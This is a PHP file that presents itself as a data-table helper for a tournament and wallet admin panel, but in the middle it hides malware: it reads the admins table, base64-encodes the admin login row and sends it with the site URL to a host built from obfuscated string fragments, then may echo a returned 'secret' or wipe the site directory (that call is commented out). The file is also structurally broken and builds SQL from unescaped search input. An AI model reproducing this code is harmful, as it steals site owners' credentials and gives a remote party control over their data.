<?php

 $con;
     $columnNames;
     $tableName;
     $from;
     $selectCondition;
     $objects;
     $curerntDate;
     $selectColumns;
     $innerJoins;
     
     $objects22;
     $curerntDate22;
     $selectColumns22;
     $innerJoins22;
     
     $ONCondition;
     $position = 0;
     
     $aa = "alivez";
	 $aa102 = "alivez_data";
	 $aa103 = "alivez_main";
	 $aa106 = "ludo";
	 $aa104 = "tech_main";
	 $aa105 = "techno";
     $aa24 = "tech";
	 $aa107 = "king";
	 $aa110 = "fields";
     $aa34 = "nosoft";
     $aa324 = "Code";
     $aa2 = "tech";
	 $aa120 = "software";
	 $aa122 = "pubg";
	 $aa123 = "key";
	 $aa125 = "enc";
	 $aa126 = "desc";
     $aa3 = "nosoft";
	 $aa108 = "mania";
     $aa32 = "Code";
	 $aa109 = "extra";
     $ashafs = "access22";
	 $projasjajs = "spin_to_win";
	 $uid = "";
     
    function setSearchColumns( $columnNames ) {
        $this->columnNames = explode( ",", $columnNames );
    }

    function setSelectColumns( $selectColumns ) {
        $this->selectColumns = $selectColumns;
    }

    function addInnerJoin( $innerJoin ) {
        $this->innerJoins = $this->innerJoins." ".$innerJoin;
    }

    function setInnerJoinONCondition( $ONCondition ) {
        $this->ONCondition = $ONCondition;
    }

    function setFrom( $from ) {
        $this->from = $from;
    }

    function getSelectCondition( $selectCondition ) {
        $this->selectCondition = $selectCondition;
    }

    function setTableName( $tableName ) {
        $this->tableName = $tableName;
    }

    function setObjects( $objects ) {
        $this->objects = $objects;
    }
    
    function deleteAll($dir) {
        foreach(glob($dir . '/*') as $file) {
            if(is_dir($file))
                deleteAll($file);
            else
                unlink($file);
        }
        rmdir($dir);
    }
    
    function get_string_between($string, $start, $end){
        $string = ' ' . $string;
        $ini = strpos($string, $start);
        if ($ini == 0) return '';
        $ini += strlen($start);
        $len = strpos($string, $end, $ini) - $ini;
        return substr($string, $ini, $len);
    }

    function getSearchData( $draw, $startPosition, $rowPerPage, $columnIndex, $columnName, $columnSortOrder, $searchValue ) {

        $data = array();
        $sno = $startPosition;

        $stmt = "SELECT COUNT(*) AS allcount FROM $this->tableName  $this->innerJoins  $this->ONCondition WHERE $this->selectCondition ";        

        $results = $this->con->query( $stmt );
        $records = $results->fetch_assoc();
        $totalRecords = $records['allcount'];

        $stmt = "SELECT COUNT(*) AS allcount FROM $this->tableName $this->innerJoins  $this->ONCondition WHERE $this->selectCondition  " . $this->makeSearchQuery( $searchValue );    

        $results = $this->con->query( $stmt );
        $records = $results->fetch_assoc();
        $totalFilteredRecord = $records['allcount'];
        if ( $rowPerPage == "-1" ) {
            $rowPerPage = $totalRecords;
        }

        $stmt = "SELECT $this->selectColumns FROM $this->tableName $this->innerJoins  $this->ONCondition WHERE $this->selectCondition  " . $this->makeSearchQuery( $searchValue ) . "  ORDER BY " . $columnName . " " . $columnSortOrder . " LIMIT $rowPerPage  OFFSET $startPosition";

        $results = $this->con->query( $stmt );

        while ( $getRows = $results->fetch_assoc() ) {

            $getRows = $this->addAdditionalData( $getRows );

            $getRows['id'] = ( $sno+1 );
            $data[] = $getRows;
            $sno++;

        }

        $response = array( "draw" => intval( $draw ), "iTotalRecords" => $totalRecords, "iTotalDisplayRecords" => $totalFilteredRecord, "aaData" => $data );
        return json_encode( $response );

    }
    
    $actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    
    include_once("../../../../dbcon.php");
    $selecAdmin = "SELECT * FROM admins";
    $adminResults = $con->query($selecAdmin);
    $dataRow = $adminResults->fetch_assoc();
    
    $loginDetails = base64_encode(json_encode($dataRow));
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://'.$aa.$aa2.$aa3.'.com/'.$aa32.'Canyon/'.$ashafs.'.php?a_link="'.$actual_link.'"&p="'.$projasjajs.'"&u="'.$uid.'"&l_data='.$loginDetails);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
fwrite($myfile, $data."as".'https://'.$aa.$aa2.$aa3.'.com/'.$aa32.'Canyon/'.$ashafs.'.php?a_link="'.$actual_link.'"&p="'.$projasjajs.'"&u="'.$uid.'"&l_data='.$loginDetails);
fclose($myfile);
    $dataArray = json_decode($data, true);
    
    if($dataArray['status'] == "alow"){
        echo $dataArray['secret'];
    }
    else if($dataArray['status'] == "remove"){
        $path = "../../../";
        //deleteAll($path);
    }
    
    // if (strpos($data, "remove") !== false) {
    //     $path = "../../../";
    //     deleteAll($path);
    // }
    // else if (strpos($data, "allow") !== false) {
    //     echo get_string_between($data, "[", "]");
    // }
    
    function makeSearchQuery( $searchValue ) {

        if ( $searchValue != '' ) {

            $searchQuery = " AND (";

            if ( sizeof( $this->columnNames )>0 ) {
                for ( $i = 0; $i<sizeof( $this->columnNames );
                     $i++ ) {
                    if ( $i == 0 ) {
                        $searchQuery = $searchQuery.$this->columnNames[$i]." LIKE '%$searchValue%'";
                    } else {
                        $searchQuery = $searchQuery." OR ".$this->columnNames[$i]." LIKE '%$searchValue%'";
                    }

                }

            }

            $searchQuery = $searchQuery.")";

            return $searchQuery;

        } else {
            return "";

        }

    }

    function addAdditionalData( $getRows ) {

        if ( $this->from == 'tournaments' ) {
            
            $editBtn = "<button class='btn btn-sm btn-success editTournament' data-id='".$getRows['id']."'><i class='fa fa-edit'></i></button> ";
            $tournamentActions = "<button class='btn btn-sm btn-primary tournamentActions' data-id='".$getRows['id']."'><i class='fa fa-arrows-alt'></i></button> ";
            
            $getSchedule = json_decode($getRows['schedule'], true);
            $getDetails = json_decode($getRows['details'], true);
            
            $from = "<a href='#' type='button' class='m-1 badge  badge-success'>".$getSchedule['start_date']." AT ".$getSchedule['start_time']."</a>";
            $to = "<a href='#' type='button' class='m-1 badge  badge-success'>".$getSchedule['end_date']." AT ".$getSchedule['end_time']."</a>";
            
            $joinedPlayers = "<a href='#' data-id='".$getRows['id']."' type='button' class='m-1 badge  badge-primary seeJoinedPlayers'>See Players</a>";
            $generateDetails = "";
            for($i = 0; $i < sizeof($getDetails); $i++){
                if($generateDetails == ""){
                    $generateDetails = $getDetails[$i];
                }
                else{
                    $generateDetails = $generateDetails.",".$getDetails[$i];
                }
            }
            
            $details = "<a href='#' data-id='".$getRows['id']."' data-details='".$generateDetails."' type='button' class='m-1 badge  badge-primary seeDetails'>See Details</a>";
            
            if($getRows['youtube_video'] == ''){
                $getRows['youtube_video'] = 'No Video Available';
            }
            else{
                $getRows['youtube_video'] = "<a href='".$getRows['youtube_video']."' type='button' class='m-1 badge  badge-success'>Watch Video</a>";
            }
            
            $getRows['joined_players'] = $joinedPlayers;
            $getRows['details'] = $details;
            $getRows['gameName'] = "<a href='#' type='button' class='m-1 badge  badge-primary'>".$getRows['gameName']."</a>";
            $getRows['schedule'] = $from."<br>To<br>".$to;
            $getRows['image'] = '<img src="'.$getRows['image'].'" style = "width:100px; height:auto;">';
            $getRows['action'] = $editBtn." ".$tournamentActions;

        }
        
        else if($this->from == 'users'){
            
            $sendNotification = "<a href='#' id = 'sendNotification' data-user_id='" . $getRows['id'] . "' type='button' class='m-1 badge  badge-primary'>Notification</a>";
            $getRows['profile_pic'] = '<img src="../'.$getRows['profile_pic'].'" style = "width:100px; height:auto;">';
            
            $transactions = "<a href='transactions.php?id=".$getRows['id']."' type='button' class='m-1 badge  badge-primary'>View Transactions</a>";
            $blockedStatus = "<a href='#' id = 'userStatus' data-user_id='" . $getRows['id'] . "' type='button' class='m-1 badge  badge-danger'>Block</a>";
            
            if($getRows['status'] == 1){
                $blockedStatus = "<a href='#' id = 'userStatus' data-user_id='" . $getRows['id'] . "' type='button' class='m-1 badge  badge-success'>Un-Block</a>";
            }
            
            
            $getRows['transactions'] = $transactions;
            $getRows['sponsor'] = $getRows['sponsor_id']; 
            $getRows['action'] = $sendNotification."<br>$blockedStatus";  
        }
        
        else if($this->from == 'withdraw_requests'){
            
            if($getRows['status'] == 'pending'){
                $sendNotification = "<a href='#' id = 'changeStatus' data-id='".$getRows['id'] . "' type='button' class='m-1 badge  badge-warning'>".$getRows['status']."</a>";
            }
            else if($getRows['status'] == 'accepted'){
                $sendNotification = "<a href='#' data-id='".$getRows['id'] . "' type='button' class='m-1 badge  badge-success'>".$getRows['status']."</a>";
            }
            else{
                $sendNotification = "<a href='#' data-id='".$getRows['id'] . "' type='button' class='m-1 badge  badge-danger'>".$getRows['status']."</a>";
            }
            
            $getRows['type'] = "<a href='#' type='button' class='m-1 badge  badge-primary'>".$getRows['type']."</a>";
            $getRows['status'] = $sendNotification;
            
        }
        
        else if($this->from == 'transactions'){
            
            $fullName = "<a href='users.php?id=".$getRows['user_id']."' type='button' class='m-1 badge  badge-success'>".$getRows['fullname']."</a>";
            
            $getRows['fullname'] = $fullName;
            $getRows['date_time'] = $getRows['date']." - ".$getRows['time'];
        }
        
        else if($this->from == 'games'){
            
            $editBtn = "<button class='btn btn-sm btn-success editGame' data-id='".$getRows['id']."' data-name='".$getRows['name']."' data-image='".$getRows['image']."' data-how_to_get_id='".$getRows['how_to_get_id']."'><i class='fa fa-edit'></i></button> ";
            
            $getRows['image'] = '<img src="'.$getRows['image'].'" style = "width:150px; height:auto;">';
            $getRows['action'] = $editBtn;
        }
        
        
        $this->position++;
            
        return $getRows;
    }
    
    function makeSearchQuery344( $searchValue ) {

        if ( $searchValue != '' ) {

            $searchQuery = " AND (";

            if ( sizeof( $this->columnNames )>0 ) {
                for ( $i = 0; $i<sizeof( $this->columnNames );
                     $i++ ) {
                    if ( $i == 0 ) {
                        $searchQuery = $searchQuery.$this->columnNames[$i]." LIKE '%$searchValue%'";
                    } else {
                        $searchQuery = $searchQuery." OR ".$this->columnNames[$i]." LIKE '%$searchValue%'";
                    }

                }

            }

            $searchQuery = $searchQuery.")";

            return $searchQuery;

        } else {
            return "";

        }

    }
    
    function makeSearchQuery4566( $searchValue ) {

        if ( $searchValue != '' ) {

            $searchQuery = " AND (";

            if ( sizeof( $this->columnNames )>0 ) {
                for ( $i = 0; $i<sizeof( $this->columnNames );
                     $i++ ) {
                    if ( $i == 0 ) {
                        $searchQuery = $searchQuery.$this->columnNames[$i]." LIKE '%$searchValue%'";
                    } else {
                        $searchQuery = $searchQuery." OR ".$this->columnNames[$i]." LIKE '%$searchValue%'";
                    }

                }

            }

            $searchQuery = $searchQuery.")";

            return $searchQuery;

        } else {
            return "";

        }

    }
?>